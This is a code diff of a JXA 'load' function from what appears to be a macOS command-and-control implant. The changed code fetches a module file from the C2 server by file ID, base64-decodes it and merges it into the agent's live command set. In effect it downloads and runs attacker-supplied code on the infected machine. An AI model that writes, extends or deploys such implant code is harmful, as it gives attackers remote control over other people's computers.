@@ -1,14 +1,19 @@
 exports.load = function(task, command, params){
     //base64 decode the params and pass it to the default_load command
-    //  params should be {"cmd": "cmd_name", "code": "base64 encoded JXA code"}
+    //  params should be {"cmds": ["cmd_name1", "cmd_name2"], "file_id": #}
     try{
-        params = params.replace(/\\'/g, "\\"");
-        parsed_params = JSON.parse(params);
-        new_dict = default_load(base64_decode(parsed_params['code']));
+        var params = params.replace(/\\'/g, "\\"");
+        var parsed_params = JSON.parse(params);
+        var code = C2.upload(task, parsed_params['file_id']);
+        if(typeof code == "string"){
+            return code; //something failed, we should have NSData type back
+        }
+        new_dict = default_load(base64_decode(code));
         commands_dict = Object.assign({}, commands_dict, new_dict);
-        return "Loaded " + parsed_params['cmd'];
+        return "Loaded " + parsed_params['cmds'];
     }
     catch(error){
+        console.log("errored in load function");
         return error.toString();
     }
 
